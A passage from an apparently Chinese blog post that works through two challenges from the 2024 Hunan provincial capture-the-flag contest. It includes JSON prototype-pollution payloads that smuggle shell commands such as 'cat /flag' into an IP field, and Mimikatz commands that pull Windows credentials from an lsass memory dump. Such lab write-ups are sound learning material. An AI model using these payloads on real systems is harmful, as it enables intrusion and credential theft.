stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>也就是说我们只要原型链污染了，展开操作符就会沿着原型链找到所有属性，我们就可以通过原型链污染实现环境变量注入从而实现改变spawn配置</p>
<p>于是我们的思路有了，首先原型链污染很容易，就和普通的原型链污染一样，直接通过<code>__proto__</code>属性污染Object中写入<code>shell:true</code>，然后再进行命令执行即可</p>
<p>我们进入靶场，抓个包发现格式为</p>
<div class="code-container" code-lang="Json"><div class="codebox"><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span><span class="string">&quot;&#123;\&quot;ip\&quot;:\&quot;127.0.0.1\&quot;&#125;&quot;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>于是我们再写一个数据进行原型链污染</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&quot;&#123;\&quot;ip\&quot;:\&quot;127.0.0.1;whoami\&quot;,\&quot;__proto__\&quot;:&#123;\&quot;shell\&quot;:true&#125;&#125;&quot;</span>]</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>发送后发现虽然和直接拼接命令不同，没有报错但是命令也没有执行</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/09/22/2024%E6%B9%96%E5%8D%97%E7%9C%81%E7%9C%81%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20250922155218588.png" class title="image-20250922155218588">

<p>根据提示是命令执行whoami后面添加了一个未知的<code>-w1</code>配置，代码中的确拼接了</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> proc = <span class="title function_">spawn</span>(<span class="string">&quot;ping&quot;</span>, [<span class="string">`-c<span class="subst">$&#123;count&#125;</span>`</span>, body.<span class="property">ip</span>!, <span class="string">&quot;-W1&quot;</span>], &#123;</span><br><span class="line">  <span class="attr">stdio</span>: [<span class="string">&quot;inherit&quot;</span>, <span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;pipe&quot;</span>],</span><br><span class="line">  <span class="attr">env</span>: &#123; ...process.<span class="property">env</span>, <span class="attr">LC_ALL</span>: <span class="string">&quot;C.UTF-8&quot;</span> &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>这个应该是ping命令独有的配置，我们只需要在后面添加一个ping命令即可</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&quot;&#123;\&quot;ip\&quot;:\&quot;127.0.0.1;cat /flag;ping 127.0.0.1\&quot;,\&quot;__proto__\&quot;:&#123;\&quot;shell\&quot;:true&#125;&#125;&quot;</span>]</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>成功拿到flag</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/09/22/2024%E6%B9%96%E5%8D%97%E7%9C%81%E7%9C%81%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20250922155833428.png" class title="image-20250922155833428">



<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="PPT"><a href="#PPT" class="headerlink" title="PPT"></a>PPT</h3><p>附件下载下来是一个PPT文件，当无法直接用PPT打开的时候我就该感觉到不对劲，而不是去修复。</p>
<p>用010editor打开发现是PK开头，那就是zip文件了，但是我又在题解中找到了一个用来分离文件的工具DIE，这次用DIE试一下</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/09/22/2024%E6%B9%96%E5%8D%97%E7%9C%81%E7%9C%81%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20250922203734133.png" class title="image-20250922203734133">

<p>通过这个提取器去提取文件</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/09/22/2024%E6%B9%96%E5%8D%97%E7%9C%81%E7%9C%81%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20250922203835311.png" class title="image-20250922203835311">

<p>效果不错，感觉比某binwalk要好用多了，我们解压压缩包后又找到了一个特殊文件</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/09/22/2024%E6%B9%96%E5%8D%97%E7%9C%81%E7%9C%81%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20250922204024047.png" class title="image-20250922204024047">

<p>到过来念的是高手，尝试用010editor打开，拉到最后发现有个</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/09/22/2024%E6%B9%96%E5%8D%97%E7%9C%81%E7%9C%81%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20250922204211843.png" class title="image-20250922204211843">

<p>好像是将16进制全部到过来了，自己不会写脚本，只能抄大佬的</p>
<div class="code-container" code-lang="Python"><div class="codebox"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_binary_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="comment"># 读取原始二进制文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        content = <span class="built_in">bytearray</span>(file.read())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 反转字节序列</span></span><br><span class="line">    reversed_content = content[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 写入新的反转后的文件</span></span><br><span class="line">    new_file_path = <span class="string">f&quot;<span class="subst">&#123;file_path&#125;</span>_reversed&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(new_file_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> new_file:</span><br><span class="line">        new_file.write(reversed_content)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;原始文件已成功反转并保存为 <span class="subst">&#123;new_file_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reverse_binary_file(<span class="string">&quot;手高是的念来过倒&quot;</span>)</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>也不是代码看不懂，而是很少写代码了，都不知道线下赛该怎么办啊。</p>
<p>然后将后缀改为zip，解压发现需要密码，再次在010中查看发现末尾有提示</p>
<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weakpassword</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>醒着的密码，看题解说提示我们密码可以爆破出来，尝试爆破，密码为2233</p>
<p>解压发现是一个dmp文件，百度了一下发现是Windows的蓝屏文件，看了题解突然想起来之前做题遇到的一个Mimikatz工具，利用这个工具可以解析dmp文件然后推断出Windows用户名和密码等信息</p>
<p>先载入dmp文件</p>
<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>然后再获取用户名和密码</p>
<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>最后拿到</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/09/22/2024%E6%B9%96%E5%8D%97%E7%9C%81%E7%9C%81%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20250922205749921.png" class title="image-20250922205749921">

<p>虽然我不知道这是如何做到的，也不知道输出的是什么，但是只要看到flag就行了</p>
</div><div class="post-reward"><div class="post-reward-btn" title="赞赏作者"><img src="/assets/images/svg/uc/uc-gift.svg" class="icon noview" alt="Icon"><span></span></div><div class="post-reward-content"><div class="post-reward-text"></div><div class="post-reward-list"><a href="/null" target="_blank">致谢名单</a></div></div></div><div class="post-copyright"><div class="post-copyright-info">本作品由 Regulus 于 2025-09-22 10:09:38 发布</div><div class="post-copyright-link"><span>作品地址：<a href="http://example.com/2025/09/22/2024%E6%B9%96%E5%8D%97%E7%9C%81%E7%9C%81%E8%B5%9B%E5%A4%8D%E7%8E%B0/">2024湖南省省赛复现</a></span><button class="copy-text" type="button" data-text="http://example.com/2025/09/22/2024%E6%B9%96%E5%8D%97%E7%9C%81%E7%9C%81%E8%B5%9B%E5%A4%8D%E7%8E%B0/">复制</button></div><div class="post-copyright-detail">除特别声明外，本站作品均采用 <a href='https://creativecommons.org/licenses/by-nc-sa/4.0/' title='Attribution-NonCommercial-ShareAlike' target='_blank'>CC BY-NC-SA 4.0</a> 许可协议，转载请注明来自 <a href='/'>Mei的小窝</a></div><img class="post-copyright-icon noview" src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></div><div class="post-tail-tags"><a class="post-tail-tags-link" href="/tags/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="tag">js原型链污染</a><a class="post-tail-tags-link" href="/tags/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/" rel="tag">电子取证</a></div></div><aside id="post-sidebar" status="show"><div id="toc-container"><div class="toc-title"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"><span>目录</span></div><div class="toc-content" id="toc-div"><ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#2024%E6%B9%96%E5%8D%97%E7%9C%81%E7%9C%81%E8%B5%9B%E5%A4%8D%E7%8E%B0"><span class="toc-list-text">2024湖南省省赛复现</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#web"><span class="toc-list-text">web</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E5%85%A5%E5%8F%A3%E9%9D%B6%E6%9C%BA-pingline"><span class="toc-list-text">[入口靶机]pingline</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#Misc"><span class="toc-list-text">Misc</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#PPT"><span class="toc-list-text">PPT</span></a></li></ol></li></ol></li></ol></div></div></aside></div></div><div id="toolbar" hide=""><div id="toolbar-setting-container" hide=""><div class="toolbar-item"><button id="tool-color-mode" title="深色模式" type="button"><img src="/assets/images/svg/ta/ta-moon.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button class="copy-text" id="tool-share" title="分享" type="button" data-text="http://example.com/2025/09/22/2024%E6%B9%96%E5%8D%97%E7%9C%81%E7%9C%81%E8%B5%9B%E5%A4%8D%E7%8E%B0/"><img src="/assets/images/svg/ta/ta-share.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-plus" title="放大字体" type="button"><img src="/assets/images/svg/ta/ta-text-plus.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-minus" title="缩小字体" type="button"><img src="/assets/images/svg/ta/ta-text-minus.svg" class="icon noview" alt="Icon"></button></div></div><div class="toolbar-container"><div class="toolbar-item"><button id="tool-setting" title="设置" type="button"><img src="/assets/images/svg/ta/ta-setting.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-toc" title="目录" type="button"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-gototop" title="返回顶部" type="button"><img src="/assets/images/svg/ta/ta-up.svg" class="icon noview" alt="Icon"></button></div></div></div><div class="search-overlay"><div class="search-container"><div class="search-header"><div class="search-title"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg>
搜索</div><div class="search-close-btn"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 21a9 9 0 0 0 9 -9a9 9 0 0 0 -9 -9a9 9 0 0 0 -9 9a9 9 0 0 0 9 9z" /><path d="M9 8l6 8" /><path d="M15 8l-6 8" /></svg></div></div><div class="search-input-box"><input id="search-input" type="search" placeholder="请输入关键词进行站内搜索……" value="" maxlength="80"/></div><div class="search-result-container"><div class="search-result-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg></div></div></div></div></main><footer><div class="footer"><div id="footer-copyright">© 2024 - 2026 <span>💗</span> <a href="/null">Regulus</a></div><div id="footer-info"><div id="footer-framework">🚀本站由 <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/chanwj/hexo-theme-meow" title="3.2.0" target="_blank">Meow</a> 强力驱动</div><div id="footer-runtime"><span id="runtime" data-startdate="2024-04-02T22:16:20.000Z">🌻已稳定运行.年.月.天</span></div></div><div id="footer-statistic"><span>共撰写169篇文章，全站共461.6k字</span></div><div id="footer-pageview"><div id="container_site_pv"><span>🔥总访问量</span><span id="vercount_value_site_pv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 6l0 -3" /><path d="M16.25 7.75l2.15 -2.15" /><path d="M18 12l3 0" /><path d="M16.25 16.25l2.15 2.15" /><path d="M12 18l0 3" /><path d="M7.75 16.25l-2.15 2.15" /><path d="M6 12l-3 0" /><path d="M7.75 7.75l-2.15 -2.15" /></svg></span></div><div id="container_site_uv"><span>🐈访客人数</span><span id="vercount_value_site_uv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 6l0 -3" /><path d="M16.25 7.75l2.15 -2.15" /><path d="M18 12l3 0" /><path d="M16.25 16.25l2.15 2.15" /><path d="M12 18l0 3" /><path d="M7.75 16.25l-2.15 2.15" /><path d="M6 12l-3 0" /><path d="M7.75 7.75l-2.15 -2.15" /></svg></span></div></div></div></footer><div class="scripts"><script>const GLOBALCONFIG = {
  root: '/',
  toolbar: true,
  lazyload_src: '/assets/images/Meow-Loading.webp',
  friends: false,
  codeblock: true,
  share_text: '',
  onblur_title: 'Please Come Back～✧(´▽`ʃ♡ƪ)',
  mouse_click: false,
  notify:{
    enable: false,
    info: '复制成功～转载请标注本文地址',
    f12_info: '开发者模式已打开，请遵循本站版权协议'
  },
  search: {
    enable: true,
    path: 'search.json',
    local: {
      top_n_per_article: 1,
      preload: false
    }
  },
  encrypt: false,
};
</script><script>if (!localStorage.getItem('color-mode')) {
  localStorage.setItem('color-mode', 'light' || 'light');
}
document.body.setAttribute('data-mode', localStorage.getItem('color-mode'));
</script>
<script src="/js/theme/tools/utils.js"></script>

<script src="/js/plugins/dist/lazyload.min.js"></script>

<script src="/js/plugins/view-image.min.js"></script>
<script src="https://events.vercount.one/js" defer="defer"></script><script>if (localStorage.getItem('font-size')) {
  document.querySelector('.post').style.fontSize = localStorage.getItem('font-size') + 'px';
}
</script>
<script src="/js/plugins/dist/search.js"></script>

<script src="/js/main.js" type="module"></script>
</div></body></html>